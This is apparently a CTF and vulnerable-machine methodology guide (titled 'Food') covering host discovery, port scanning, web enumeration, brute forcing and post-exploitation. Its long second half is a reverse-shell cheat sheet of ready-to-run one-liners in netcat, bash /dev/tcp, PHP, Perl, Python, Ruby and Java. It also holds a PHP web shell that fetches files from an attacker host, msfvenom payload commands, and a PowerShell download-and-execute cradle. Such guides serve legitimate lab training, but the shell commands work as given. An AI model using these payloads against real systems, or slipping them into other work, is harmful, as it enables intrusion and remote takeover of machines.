<!-- TITLE: Food -->
<!-- SUBTITLE: A quick summary of Food -->

CTF Series : Vulnerable Machines

This post (Work in Progress) records what we learned by doing vulnerable machines provided by <a href="https://vulnhub.com" class="reference external">VulnHub</a>, <a href="https://hackthebox.eu" class="reference external">Hack the Box</a> and others. The steps below could be followed to find vulnerabilities, exploit these vulnerabilities and finally achieve system/ root.

Once you download a virtual machines from <a href="https://vulnhub.com" class="reference external">VulnHub</a> you can run it by using virtualisation software such as VMware or Virtual Box.

We would like to **thank g0tm1lk** for maintaining **Vulnhub** and the **moderators** of **HackTheBox**. Also, **shout-outs** are in order for each and every **author of Vulnerable Machines and/ or write-ups**. Thank you for providing these awesome challenges to learn from and sharing your knowledge with the IT security community! **Thank You!!**



# Finding the IP address

Before, exploiting any machine, we need to figure out its IP address.

## Netdiscover

An active/ passive arp reconnaissance tool

    netdiscover [options]
    -i interface : The network interface to sniff and inject packets on.
    -r range : Scan a given range instead performing an auto scan.

    Example:
    netdiscover -i eth0/wlan0/vboxnet0/vmnet1 -r 192.168.1.0/24

Interface names of common Virtualisation Software:

-   Virtualbox : vboxnet
-   Vmware : vmnet

## Nmap

Network exploration tool and security/ port scanner

    nmap [Scan Type] [Options] {target specification}
    -sP/-sn Ping Scan -disable port scan

Example:

    nmap -sP/-sn 192.168.1.0/24



# Port Scanning

Port scanning provides a large amount of information about open (exposed) services and possible exploits that may target these services.

Common port scanning software include: nmap, unicornscan, netcat (when nmap is not available).

## Nmap

Network exploration tool and security/ port scanner

    nmap [Scan Type] [Options] {target specification}

    HOST DISCOVERY:
    -sL: List Scan - simply list targets to scan
    -sn/-sP: Ping Scan - disable port scan
    -Pn: Treat all hosts as online -- skip host discovery

    SCAN TECHNIQUES:
    -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
    -sU: UDP Scan -sN/sF/sX: TCP Null, FIN, and Xmas scans

    PORT SPECIFICATION:
    -p : Only scan specified ports
    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9

    SERVICE/VERSION DETECTION:
    -sV: Probe open ports to determine service/version info

    OUTPUT:
    -oN/-oX/-oS/-oG : Output scan in normal, XML,Output in the three major formats at once
    -v: Increase verbosity level (use -vv or more for greater effect)

    MISC: -6: Enable IPv6 scanning -A: Enable OS detection, version detection, script scanning, and traceroute

## Unicornscan

A port scanner that utilizes its own userland TCP/IP stack, which allows it to run asynchronous scans. It can scan 65,535 ports in a relatively short time frame.

As unicornscan is faster then nmap it makes sense to use it for scanning large networks or a large number of ports. The idea is to use unicornscan to scan all ports, and make a list of those ports that are open and pass them to nmap for service detection. Superkojiman has written <a href="https://github.com/superkojiman/onetwopunch" class="reference external">onetwopunch</a> for this.

    unicornscan [options] X.X.X.X/YY:S-E
      -i, --interface : interface name, like eth0 or fxp1, not normally required
      -m, --mode : scan mode, tcp (syn) scan is default, U for udp T for tcp \`sf' for tcp connect scan and A for arp for -mT you can also specify tcp flags following the T like -mTsFpU for example that would send tcp syn packets with (NO Syn\|FIN\|NO Push\|URG)

      Address ranges are in cidr notation like 1.2.3.4/8 for all of 1.?.?.?, if you omit the cidr mask /32 is implied.
      Port ranges are like 1-4096 with 53 only scanning one port, **a** for all 65k and p for 1-1024

     example: unicornscan 192.168.1.5:1-4000 gateway:a would scan port 1 - 4000 for 192.168.1.5 and all 65K ports for the host named gateway.

## Netcat

Netcat might not be the best tool to use for port scanning, but it can be used quickly. While Netcat scans TCP ports by default it can perform UDP scans as well.

### TCP Scan

For a TCP scan, the format is:

    nc -vvn -z xxx.xxx.xxx.xxx startport-endport

       -z flag is Zero-I/O mode (used for scanning)
       -vv will provide verbose information about the results
       -n flag allows to skip the DNS lookup

### UDP Scan

For a UDP Port Scan, we need to add -u flag which makes the format:

    nc -vvn -u -z xxx.xxx.xxx.xxx startport-endport

If we have windows machine without nmap, we can use <a href="https://www.powershellgallery.com/packages/PSnmap/" class="reference external">PSnmap</a>

## Amap - Application mapper

When portscanning a host, you will be presented with a list of open ports. In many cases, the port number tells you which application is running. Port 25 is usually SMTP, port 80 mostly HTTP. However, this is not always the case, and especially when dealing with proprietary protocols running on non-standard ports you will not be able to determine which application is running.

By using **amap**, we can identify which services are running on a given port. For example is there a SSL server running on port 3445 or some oracle listener on port 23? Note that the application can also handle services that requires SSL. Therefore it will perform an SSL connect followed by trying to identify the SSL-enabled protocol!. e.g. One of the vulnhub VM’s was running http and https on the same port.

    amap -A 192.168.1.2 12380
    amap v5.4 (www.thc.org/thc-amap) started at 2016-08-10 05:48:09 - APPLICATION MAPPING mode
    Protocol on 192.168.1.2:12380/tcp matches http
    Protocol on 192.168.1.2:12380/tcp matches http-apache-2
    Protocol on 192.168.1.2:12380/tcp matches ntp
    Protocol on 192.168.1.2:12380/tcp matches ssl
    Unidentified ports: none.
    amap v5.4 finished at 2016-08-10 05:48:16



# Rabbit Holes

There will be instances when we will not able to find anything entry point such as any open port. The section below may provide some clues on how to get unstuck.

Note

When in doubt, enumerate



## Listen to the interface

Many VMs send data on random ports therefore we recommend to listen to the local interface (vboxnet0 / vmnet) on which the VM is running. This can be done by using wireshark or tcpdump. For example, one of the vulnhub VMs, performs an arp scan and sends a SYN packet on port 4444, if something is listening on that port, it sends some data.

    tcpdump -i eth0

    18:02:04.096292 IP 192.168.56.101.36327 > 192.168.56.1.4444: Flags [S], seq 861815232, win 16384, options [mss 1460,nop,nop,sackOK,nop,wscale 3,nop,nop,TS val 4127458640 ecr 0], length 0
    18:02:04.096330 IP 192.168.56.1.4444 > 192.168.56.101.36327: Flags [R.], seq 0, ack 861815233, win 0, length 0
    18:02:04.098584 ARP, Request who-has 192.168.56.2 tell 192.168.56.101, length 28
    18:02:04.100773 ARP, Request who-has 192.168.56.3 tell 192.168.56.101, length 28
    18:02:04.096292 IP 192.168.56.101.36327 > 192.168.56.1.4444: Flags [S],

While listening on port 4444, we might receive something like a base64 encoded string or some message.

    nc -lvp 4444
    listening on [any] 4444 …
    192.168.56.101: inverse host lookup failed: Unknown host
    connect to [192.168.56.1] from (UNKNOWN) [192.168.56.101] 39519
    0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxh

## DNS Server

If the targeted machine is running a DNS Server and we have a possible domain name, we may try to figure out A, MX, AAAA records or try zone-transfer to figure out other possible domain names.

    host <domain> <optional_name_server>
    host -t ns <domain>                -- Name Servers
    host -t a <domain>                 -- Address
    host -t aaaa <domain>              -- AAAA record points a domain or subdomain to an IPv6 address
    host -t mx <domain>                -- Mail Servers
    host -t soa <domain>               -- Start of Authority
    host <IP>                          -- Reverse Lookup
    host -l <Domain Name> <DNS Server> -- Domain Zone Transfer

Example:

    host scanme.nmap.org
    scanme.nmap.org has address 45.33.32.156
    scanme.nmap.org has IPv6 address 2600:3c01::f03c:91ff:fe18:bb2f

## SSL Certificate

If the targeted machine is running an https server and we are getting an apache default webpage on hitting the <a href="https://IPAddress" class="reference external">https://IPAddress</a>, virtual hosts would be probably in use. Check the alt-dns-name on the ssl-certificate, create an entry in hosts file (/etc/hosts) and check what is being hosted on these domain names by surfing to <a href="https://alt-dns-name" class="reference external">https://alt-dns-name</a>.

nmap service scan result for port 443 (sample)

    | ssl-cert: Subject: commonName=examplecorp.com/organizationName=ExampleCorp Ltd./stateOrProvinceName=Attica/countryName=IN/localityName=Mumbai/organizationalUnitName=IT/emailAddress=admin@examplecorp.com
    | Subject Alternative Name: DNS:www.examplecorp.com, DNS:admin-portal.examplecorp.com



# From Nothing to a Unprivileged Shell

At this point, we would have an idea about the different services and service version running on the system. Besides the output given by nmap. It is also recommended to check what software is being used on the webservers (e.g. certain cms’s)

## searchsploit

Exploit Database Archive Search

First of all, we check if the operating system and/ or the exposed services are vulnerable to exploits which are already available on the internet. For example, a vulnerable service webmin is present in one of the VMs which could be exploited to extract information from the system.

    root@kali:~# nmap -sV -A 172.16.73.128
    **********Trimmed**************
    10000/tcp open  http        MiniServ 0.01 (Webmin httpd)
    |_http-methods: No Allow or Public header in OPTIONS response (status code 200)
    |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
    | ndmp-version:
    |_  ERROR: Failed to get host information from server
    **********Trimmed**************

If we search for webmin with searchsploit, we will find different exploits available for it and we just have to use the correct one based on utility and the matching version.

    root@kali:~# searchsploit webmin
    **********Trimmed**************
    Description                                                                            Path
    ----------------------------------------------------------------------------------------------------------------
    Webmin < 1.290 / Usermin < 1.220 Arbitrary File Disclosure Exploit                   | /multiple/remote/1997.php
    Webmin < 1.290 / Usermin < 1.220 Arbitrary File Disclosure Exploit (perl)            | /multiple/remote/2017.pl
    Webmin 1.x HTML Email Command Execution Vulnerability                                | /cgi/webapps/24574.txt
    **********Trimmed**************

Once we have figured out which exploit to check we can read about it by using the file-number. For example: 1997, 2017, 24574 in the above case.

    searchsploit -x 24674

Searchsploit provides an option to read the nmap XML file and suggest vulnerabilities (Requires nmap -sV -x xmlfile).

    searchsploit
         --nmap     [file.xml]  Checks all results in Nmap's XML output with service version (e.g.: nmap -sV -oX file.xml).
                                Use "-v" (verbose) to try even more combinations

Tip

If we don’t manage to find an exploit for a specific version, it is recommended to check the notes of the exploits which are highlighted as they may be valid for lower versions too. For example Let’s say we are searching for exploits in Example\_Software version 2.1.3. However, version 2.2.2 contains multiple vulnerablities. Reading the description for 2.2.2 we find out it’s valid for lower versions too.

## SecLists.Org Security Mailing List Archive

There will be some days, when you won’t find vulnerabilities with searchsploit. In this case, we should also check the <a href="http://seclists.org/" class="reference external">SecLists.Org Security Mailing List Archive</a>, if someone has reported any bug(s) for that particular software that we can exploit.

## Google-Vulns

It is suggested that whenever you are googling something, you add words such as vulnerability, exploit, ctf, github, python, tool etc. to your search term. For example. Let’s say, you are stuck in a docker or on a specific cms search for docker ctf or \<cms\_name\> ctf/ github etc.

## Webservices

If a webserver is running on a machine, we can start with running

### whatweb

Utilize whatweb to find what software stack a server is running.

    whatweb www.example.com
    http://www.example.com [200 OK] Cookies[ASP.NET_SessionId,CMSPreferredCulture,citrix_ns_id], Country[INDIA][IN], Email[infosecurity@zmail.example.com], Google-Analytics[Universal][UA-6386XXXXX-2], HTML5, HTTPServer[Example Webserver], HttpOnly[ASP.NET_SessionId,CMSPreferredCulture,citrix_ns_id], IP[XXX.XX.XX.208], JQuery[1.11.0], Kentico-CMS, Modernizr, Script[text/javascript], Title[Welcome to Example Website ][Title element contains newline(s)!], UncommonHeaders[cteonnt-length,x-cache-control-orig,x-expires-orig], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=9,IE=edge]

### nikto

nikto - Scans a web server for known vulnerabilities.

It will examine a web server to find potential problems and security vulnerabilities, including:

-   Server and software misconfigurations
-   Default files and programs
-   Insecure files and programs
-   Outdated servers and programs

### dirb, wfuzz, dirbuster

Furthermore, we can run the following programs to find any hidden directories.

-   <a href="https://tools.kali.org/web-applications/dirb" class="reference external">DIRB</a> is a Web Content Scanner. It looks for existing (and/ or hidden) Web Objects. It basically works by launching a dictionary based attack against a web server and analysing the response.
-   <a href="https://tools.kali.org/web-applications/wfuzz" class="reference external">wfuzz</a> - a web application bruteforcer. Wfuzz might be useful when you are looking for webpage of a certain size. For example: Let’s say, when we dirb we get 50 directories. Each directory containing an image. Often, we then need to figure out which image is different. In this case, we would figure out what’s the size of the normal image and hide that particular response with wfuzz.
-   <a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project" class="reference external">Dirbuster</a> : DirBuster is a multi threaded java application designed to brute force directories and files names on web/ application servers.

Tip

Most likely, we will be using common.txt (/usr/share/wordlists/dirb/) . If it’s doesn’t find anything, it’s better to double check with /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt which is a list of directories that where found on at least 2 different hosts when DirBuster project crawled the internet. Even if that doesn’t work out, try searching with extensions such as .txt, .js, .html, .php. (.txt by default and rest application based)

Tip

If using the dirb/wfuzz wordlist doesn’t result in any directories and the website contains a lot of text, it might be a good idea to use `cewl` to create a wordlist and utilize that as a dictionary to find hidden directories. Also, it sometimes make sense to dirb/wfuzz the IP Address instead of the hostname like filesrv.example.com (Maybe found by automatic redirect)

Todo

add Gobuster?

### BurpSuite Spider

There will be some cases when dirb/ dirbuster doesn’t find anything. This happened with us on a Node.js web application. Burpsuite’s spider helped in finding extra-pages which contained the credentials.

### Parameter Fuzz?

Sometimes, we might have a scenario where we have a website which might be protected by a WAF.

    http://IP/example

Now, this “/example” might be a php or might be accepting a GET Parameter. In that case, we probably need to fuzz it. The hardest part is that we can only find the GET parameters by fuzzing “/example” if you get some errors from the application, so the goal is to fuzz using a special char as the parameter’s value, something like: “/example?FUZZ=’ “

    wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "User-Agent: SomethingNotObivousforWAF" "http://IP/example?FUZZ='"

The other things which we may try is putting a valid command such as ‘ls, test’ so it becomes FUZZ=ls or FUZZ=test

### PUT Method

Sometimes, it is also a good idea to check the various HTTP verbs that are available such as GET, PUT, DELETE, etc. This can be done by making an **OPTIONS** request.

Curl can be used to check the available options (supported http verbs):

    curl -X OPTIONS -v http://192.168.126.129/test/
    Trying 192.168.126.129…
    Connected to 192.168.126.129 (192.168.126.129) port 80 (#0)
    > OPTIONS /test/ HTTP/1.1
    > Host: 192.168.126.129
    > User-Agent: curl/7.47.0
    > Accept: /
    >
    < HTTP/1.1 200 OK
    < DAV: 1,2
    < MS-Author-Via: DAV
    < Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
    < Allow: OPTIONS, GET, HEAD, POST
    < Content-Length: 0
    < Date: Fri, 29 Apr 2016 09:41:19 GMT
    < Server: lighttpd/1.4.28
    <
    * Connection #0 to host 192.168.126.129 left intact

The PUT method allows you to upload a file which can help us to get a shell on the machine. There are multiple methods available for uploading a file with the PUT method mentioned on <a href="http://www.smeegesec.com/2014/10/detecting-and-exploiting-http-put-method.html" class="reference external">Detecting and exploiting the HTTP Put Method</a>

A few are:

-   Nmap:

>     nmap -p 80 --script http-put --script-args http-put.url='/uploads/rootme.php',http-put.file='/tmp/rootme.php'

-   curl:

>     curl --upload-file test.txt -v --url http://192.168.126.129/test/test.txt
>
>     or
>
>     curl -X PUT -d '
>     curl -i -X PUT -H "Content-Type: application/xml; charset=utf-8" -d @"/tmp/some-file.xml" http://IPAddress/newpage
>     curl -X PUT -d "text or data to put" http://IPAddress/destination_page
>     curl -i -H "Accept: application/json" -X PUT -d "text or data to put" http://IPAddress/new_page

### Wordpress

When faced with a website that makes use of the wordpress CMS one can run wpscan. Make sure you run –enumerate u for enumerating usernames because by default wpscan doesn’t run it. Also, scan for plugins

    wpsscan
      --url       | -u <target url>       The WordPress URL/domain to scan.
      --force     | -f                    Forces WPScan to not check if the remote site is running WordPress.
      --enumerate | -e [option(s)]        Enumeration.
      option :
          u        usernames from id 1 to 10
          u[10-20] usernames from id 10 to 20 (you must write [] chars)
          p        plugins
          vp       only vulnerable plugins
          ap       all plugins (can take a long time)
          tt       timthumbs (vulnerability scanner)
          t        themes
          vt       only vulnerable themes
          at       all themes (can take a long time)
          Multiple values are allowed : "-e tt,p" will enumerate timthumbs and plugins

          If no option is supplied, the default is "vt,tt,u,vp"
          (only vulnerable themes, timthumbs, usernames from id 1 to 10, only vulnerable plugins)

We can also use wpscan to bruteforce passwords for a given username

    wpscan --url http://192.168.1.2 --wordlist wordlist.txt --username example_username

**Tips**

-   If we have found a username and password of Wordpress with admin privileges, we can upload a php meterpreter. One of the possible ways is to go to Appearance > Editor > Edit 404 Template.
-   The configuration of Worpdress is normally speaking stored in **wp-config.php**. If you are able to download it, you might be lucky and be able to loot plaintext username and passwords to the database or wp-admin page.
-   If the website is vulnerable for SQL-Injection. We should be able to extract the Wordpress users and their password hashes. However, if the password hash is not crackable. Probably, check the wp-posts table as it might contain some hidden posts.
-   Got Wordpress credentials, maybe utilize <a href="https://wordpress.org/plugins/wpterm/" class="reference external">WPTerm</a> an xterm-like plugin. It can be used to run non-interactive shell commands from the WordPress admin dashboard.
-   If there’s a custom plugin created, it would probably be in the location

>     http://IP/wp-content/plugins/custompluginname

Todo

what is the (standard) format of a wp hash and where in the database is it stored? Elborate more on wp scanning and vulnerabilities?

### Names? Possible Usernames & Passwords?

Sometimes, when visiting webpages, you will find possible names of the employees working in the company. It is common practice to have a username based on your first/ last name. Superkojiman has written <a href="https://gist.githubusercontent.com/superkojiman/11076951/raw/8b0d545a30fd76cb7808554b1c6e0e26bc524d51/namemash.py" class="reference external">namemash.py</a> which could be used to create possible usernames. However, after completion we are left with a large amount of potential usernames with no passwords.

If the vulnerable machine is running a SMTP mail server, we can verify if a particular username exists or not.

-   Using metasploit smtp\_enum module: Once msfconsole is running, use auxiliary/scanner/smtp/smtp\_enum, enter the RHOSTS (target address) and USER FILE containing the list of probable user accounts.
-   Using VRFY command:
-   Using RCPT TO command:

Once we have identified a pattern of username creation, we may modify namemash.py to generate usernames and check if they exist or not.

### Brute forcing:

Hydra can be used to brute force login web pages

    -l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE  (userlist)
    -p PASS  or -P FILE try password PASS, or load several passwords from FILE  (passwordlist)
    -U        service module usage details
    -e nsr additional checks, "n" for null password, "s" try login as pass, "r" try the reverse login as pass

hydra http-post-form:

    hydra -U http-post-form

**Help for module http-post-form**

Module http-post-form requires the page and the parameters for the web form.

The parameters take three “:” separated values, plus optional values.

    Syntax:   <url>:<form parameters>:<condition string>[:<optional>[:<optional>]

-   First is the page on the server to send a GET or POST request to (URL).
-   Second is the POST/GET variables (taken from either the browser, proxy, etc. with usernames and passwords being replaced with the “\^USER\^” and “\^PASS\^” placeholders (FORM PARAMETERS)
-   Third is the string that it checks for an *invalid* login (by default). Invalid condition login check can be preceded by “F=”, successful condition login check must be preceded by “S=”. This is where most people get it wrong. You have to check the webapp what a failed string looks like and put it in this parameter!
-   The following parameters are optional: C=/page/uri to define a different page to gather initial cookies from (h\|H)=My-Hdr: foo to send a user defined HTTP header with each request \^USER\^ and \^PASS\^ can also be put into these headers!

> ‘h’ will add the user-defined header at the end regardless it’s already being sent by Hydra or not.
> ‘H’ will replace the value of that header if it exists, by the one supplied by the user, or add the header at the end

> Note that if you are going to put colons (:) in your headers you should escape them with a backslash (). All colons that are not option separators should be escaped (see the examples above and below). You can specify a header without escaping the colons, but that way you will not be able to put colons in the header value itself, as they will be interpreted by hydra as option separators.

Examples:
```
    "/login.php:user=^USER^&pass=^PASS^:incorrect"
    "/login.php:user=^USER^&pass=^PASS^&colon=colon\:escape:S=authlog=.*success"
    "/login.php:user=^USER^&pass=^PASS^&mid=123:authlog=.*failed"
    "/:user=^USER&pass=^PASS^:failed:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^"
    "/exchweb/bin/auth/owaauth.dll:destination=http%3A%2F%2F<target>%2Fexchange&flags=0&username=<domain>%5C^USER^&password=^PASS^&SubmitCreds=x&trusted=0:reason=:C=/exchweb"
```

Todo

Add a program/binary that an easier syntax, ncrack maybe? Elaborate on the examples, eg. what they will do once executed?

## Reverse Shells

Once we have figured out some vulnerability or misconfiguration in a running service which allows us to make a connection back to our attack machine, we would like to set up a reverse shell. This can be done through version methods e.g. by using netcat, php, weevely, ruby, perl, python, java, jsp, bash tcp, Xterm, Lynx, Mysql. The section below has been mostly adapted from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" class="reference external">PentestMonkey Reverse shell cheat sheet</a> and <a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/" class="reference external">Reverse Shell Cheat sheet from HighOn.Coffee</a> and more.

### netcat (nc)

-   with the -e option

>     nc -e /bin/sh 10.1.1.1 4444

-   without -e option

>     rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f

Tip

f in this case is a file name, if you want to have more then one reverse shell with this method you will have to use another letter (a … z) then the one you used intially.

### PHP

-   **PHP Web Shell**

  This is a kind of Web shell and not a reverse shell.

  We can create a new file say (shell.php) on the server containing

      `<?php system($_GET["cmd"]); ?>`

 or

     `<?php echo shell_exec($_GET["cmd"]); ?>`

 or

     `<? passthru($_GET["cmd"]); ?>`

 Which can then be accessed by:

     http://IP/shell.php?cmd=id

 If there’s a webpage which accepts phpcode to be executed, we can use curl to urlencode the payload and run it.

     curl -G -s http://10.X.X.X/somepage.php?data= --data-urlencode "html=<?php passthru('ls -lah'); ?>" -b "somecookie=somevalue" | sed '/<html>/,/<\/html>/d'

     -G When used, this option will make all data specified with -d, --data, --data-binary or --data-urlencode to be used in an HTTP GET request instead of the POST request that otherwise would be used. The data will be appended to the URL with a  '?' separator.
     -data-urlencode <data> (HTTP) Posts data, similar to the other -d, --data options with the exception that this performs URL-encoding.
     -b, --cookie <data> (HTTP) Passes the data to the HTTP server in the Cookie header. It is supposedly the data previously received from the server in a "Set-Cookie:" line.  The data should be in the format "NAME1=VALUE1; NAME2=VALUE2".

 The sed command in the end

     sed '/<html>/,/<\/html>/d'

 deletes the content between \<html\> and \</html\> tag.

 If you also want to provide upload functionality (imagine, if we need to upload nc64.exe on Windows or other-binaries on linux), we can put the below code in the php file

```
<?php
if (isset($_REQUEST['fupload'])) {
       file_put_contents($_REQUEST['fupload'], file_get_contents("http://yourIP/" . $_REQUEST['fupload']));
};
if (isset($_REQUEST['cmd'])) {
echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
}
?>
```

 The above can be accessed by

     http://IP/shell.php?fupload=filename_on_your_webserver

-   **PHP Meterpreter**

 We can create a php meterpreter shell, run a exploit handler on msf, upload the payload on the server and wait for the connection.

     msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f raw -o /tmp/payload.php

 We can set the multi-handler in metasploit by

     use exploit/multi/handler
     set payload php/meterpreter/reverse_tcp
     set LHOST yourIP
     run

-   **PHP Reverse Shell**

 The code below assumes that the TCP connection uses file descriptor 3. This worked on my test system. If it doesn’t work, try 4 or 5 or 6.

     php -r '$sock=fsockopen("192.168.56.101",1337);exec("/bin/sh -i <&3 >&3 2>&3");'

 The above can be connected to by listening on port 1337 by using nc.


Todo

### Ruby

    ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

### Perl

    perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

### Python

TCP

    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

UDP

    import os,pty,socket;s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM);s.connect(("10.10.14.17", 4445));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE",'/dev/null');pty.spawn("/bin/sh");s.close()

### Java

    r = Runtime.getRuntime()
    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
    p.waitFor()

### JSP

    msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.129 LPORT=4444 -f war > runme.war

### Bash /dev/tcp

If a server (attacker machine) is listening on a port:

    nc -lvp port

then we can use the below to connect

Method 1:

    /bin/bash -i >&/dev/tcp/IP/Port 0>&1

Method 2:

    exec 5<>/dev/tcp/IP/80
    cat <&5 | while read line; do $line 2>&5 >&5; done

    # or:

    while read line 0<&5; do $line 2>&5 >&5; done

Method 3:

    0<&196;exec 196<>/dev/tcp/IP/Port; sh <&196 >&196 2>&196

    -- We may execute the above using bash -c "Aboveline "

<a href="http://www.linuxjournal.com/content/more-using-bashs-built-devtcp-file-tcpip" class="reference external">Information about Bash Built-in /dev/tcp File (TCP/IP)</a>

The following script fetches the front page from Google:

    exec 3<>/dev/tcp/www.google.com/80
    echo -e "GET / HTTP/1.1\r\nhost: http://www.google.com\r\nConnection: close\r\n\r\n" >&3
    cat <&3

-   The first line causes file descriptor 3 to be opened for reading and writing on the specified TCP/IP socket. This is a special form of the exec statement. From the bash man page:

>     exec [-cl] [-a name] [command [arguments]]
>
> If command is not specified, any redirections take effect in the current shell, and the return status is 0. So using exec without a command is a way to open files in the current shell.

-   Second line: After the socket is open we send our HTTP request out the socket with the echo … \>&3 command. The request consists of:

>     GET / HTTP/1.1
>     host: http://www.google.com
>     Connection: close
>
> Each line is followed by a carriage-return and newline, and all the headers are followed by a blank line to signal the end of the request (this is all standard HTTP stuff).

-   Third line: Next we read the response out of the socket using cat \<&3, which reads the response and prints it out.

### Telnet Reverse Shell

    rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p

    telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443

Todo

explain the example above

### XTerm

One of the simplest forms of reverse shell is an xterm session. The following command should be run on the victim server. It will try to connect back to you (10.0.0.1) on TCP port 6001.

    xterm -display 10.0.0.1:1

To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system):

    Xnest :1 -listen tcp

You’ll need to authorize the target to connect to you (command also run on your host):

    xhost +targetip

### Lynx

Obtain an interactive shell through lynx: It is possible to obtain an interactive shell via special LYNXDOWNLOAD URLs. This is a big security hole for sites that use lynx “guest accounts” and other public services. More details <a href="http://insecure.org/sploits/lynx.download.html" class="reference external">LynxShell</a>

When you start up a lynx client session, you can hit “g” (for goto) and then enter the following URL:

    URL to open: LYNXDOWNLOAD://Method=-1/File=/dev/null;/bin/sh;/SugFile=/dev/null

### MYSQL

-   If we have MYSQL Shell via sqlmap or phpmyadmin, we can use mysql outfile/ dumpfile function to upload a shell.

>     echo -n "<?php phpinfo(); ?>" | xxd -ps 3c3f70687020706870696e666f28293b203f3e
>
>     select 0x3c3f70687020706870696e666f28293b203f3e into outfile "/var/www/html/blogblog/wp-content/uploads/phpinfo.php"
>
> or
>
>     `SELECT "<?php passthru($_GET['cmd']); ?>" into dumpfile '/var/www/html/shell.php';``

-   If you have sql-shell from sqlmap/ phpmyadmin, we can read files by using the load\_file function.

>     select load_file('/etc/passwd');

### Reverse Shell from Windows

If there’s a way, we can execute code from windows, we may try

-   Uploading ncat and executing it
-   Powershell Empire/ Metasploit Web-Delivery Method
-   Invoke-Shellcode (from powersploit)

>     Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('http://YourIPAddress:8000/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost YourIPAddress -Lport 4444 -Force"

Todo

add Nishang?

### MSF Meterpreter ELF

    msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf -o met LHOST=10.10.XX.110 LPORT=4446

### Metasploit MSFVenom

Ever wondered from where the above shells came from? Maybe try msfvenom and grep for cmd/unix

    msfvenom -l payloads | grep "cmd/unix"
    **snip**
       cmd/unix/bind_awk                                   Listen for a connection and spawn a command shell via GNU AWK
       cmd/unix/bind_inetd                                 Listen for a connection and spawn a command shell (persistent)
       cmd/unix/bind_lua                                   Listen for a connection and spawn a command shell via Lua
       cmd/unix/bind_netcat                                Listen for a connection and spawn a command shell via netcat
       cmd/unix/bind_perl                                  Listen for a connection and spawn a command shell via perl
       cmd/unix/interact                                   Interacts with a shell on an established socket connection
       cmd/unix/reverse                                    Creates an interactive shell through two inbound connections
       cmd/unix/reverse_awk                                Creates an interactive shell via GNU AWK
       cmd/unix/reverse_python                             Connect back and create a command shell via Python
       cmd/unix/reverse_python_ssl                         Creates an interactive shell via python, uses SSL, encodes with base64 by design.
       cmd/unix/reverse_r                                  Connect back and create a command shell via R
       cmd/unix/reverse_ruby                               Connect back and create a command shell via Ruby
    **snip**

Now, try to check the payload

    msfvenom -p cmd/unix/bind_netcat
    Payload size: 105 bytes
    mkfifo /tmp/cdniov; (nc -l -p 4444 ||nc -l 4444)0</tmp/cdniov | /bin/sh >/tmp/cdniov 2>&1; rm /tmp/cdniov



## Spawning a TTY Shell

Once we have reverse shell, we need a full TTY session by using either Python, sh, perl, ruby, lua, IRB. <a href="https://netsec.ws/?p=337" class="reference external">Spawning a TTY Shell</a> and <a href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty" class="reference external">Post-Exploitation Without A TTY</a> have provided multiple ways to get a tty shell

### Python

    python -c 'import pty; pty.spawn("/bin/sh")'

or

    python -c 'import pty; pty.spawn("/bin/bash")'

    python -c 'import os; os.system("/bin/bash")'

### sh

    /bin/sh -i

### Perl

    perl -e 'exec "/bin/sh";'

    perl: exec "/bin/sh";

### Ruby

    ruby: exec "/bin/sh"

### Lua

    lua: os.execute('/bin/sh')

### IRB

(From within IRB)

    exec "/bin/sh"

### VI

(From within vi)

    :!bash

(From within vi)

    :set shell=/bin/bash:shell

Also, if we execute

    vi ;/bin/bash

Once, we exit vi, we would get shell. Helpful in scenarios where the user is asked to input which file to open.

### Nmap

(From within nmap)

    !sh

### Expect

Using “Expect” To Get A TTY

    $ cat sh.exp
    #!/usr/bin/expect
    # Spawn a shell, then allow the user to interact with it.
    # The new shell will have a good enough TTY to run tools like ssh, su and login
    spawn sh
    interact

